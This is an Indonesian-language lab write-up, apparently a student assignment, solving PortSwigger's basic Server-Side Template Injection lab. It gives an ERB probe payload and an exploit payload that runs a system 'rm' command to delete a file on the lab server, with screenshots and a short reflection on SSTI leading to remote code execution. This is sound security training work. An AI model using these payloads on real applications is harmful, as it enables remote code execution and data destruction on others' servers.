# **3. Basic Server-Side Template Injection**

## **3.1 [Soal]**
Eksploitasi **Server-Side Template Injection (SSTI)** untuk mengeksekusi perintah sistem pada aplikasi PortSwigger Web Security Academy.

## **3.2 [Link resource untuk latihan]**
`https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic`

## **3.3 [Jawaban + Bukti]**
- **Step-by-step yang sudah dicoba:**
  1. Buka lab PortSwigger di browser melalui link di atas.  
  2. Klik **View details** pada produk *Snow Delivered To Your Door*.  
     → Muncul pesan: *"Unfortunately this product is out of stock"*.  
  3. Masukkan payload uji coba untuk memastikan adanya SSTI:  
     ```javascript
     const testPayload = encodeURIComponent('<%= 7*7 %>');
     window.location = `${window.location.origin}${window.location.pathname}?message=${testPayload}`;
     ```
     Hasilnya pesan berubah menjadi **49**, membuktikan bahwa template engine melakukan evaluasi ekspresi (SSTI aktif).  

  4. Selanjutnya, masukkan payload eksploitasi untuk mengeksekusi perintah sistem (menghapus file `morale.txt`):  
     ```javascript
     const exploitPayload = encodeURIComponent('<%= system("rm /home/carlos/morale.txt") %>');
     window.location = `${window.location.origin}${window.location.pathname}?message=${exploitPayload}`;
     ```
     Hasilnya halaman reload, file `/home/carlos/morale.txt` terhapus, dan status lab berubah menjadi **Solved**.  

- **Screenshot terminal/browser:**  
<img width="1920" height="1020" alt="Screenshot 2025-09-10 224810" src="https://github.com/user-attachments/assets/6fce3f91-94af-427d-9dd7-7032880db7fa" />
<img width="1920" height="1020" alt="Screenshot 2025-09-10 224823" src="https://github.com/user-attachments/assets/5d2ac403-9536-465b-9eb8-7a5c8964f68e" />


- **Catatan hasil percobaan:**
  1. **Hasil:** Eksploitasi berhasil.  
  2. **Alasan:** Payload `<%= ... %>` adalah sintaks **ERB (Ruby template)**. Dengan menyisipkan `system("rm /home/carlos/morale.txt")`, aplikasi menjalankan perintah OS di server.  
  3. **Refleksi:** SSTI sangat berbahaya karena input user bisa dievaluasi oleh template engine → berubah menjadi **Remote Code Execution (RCE)**.  
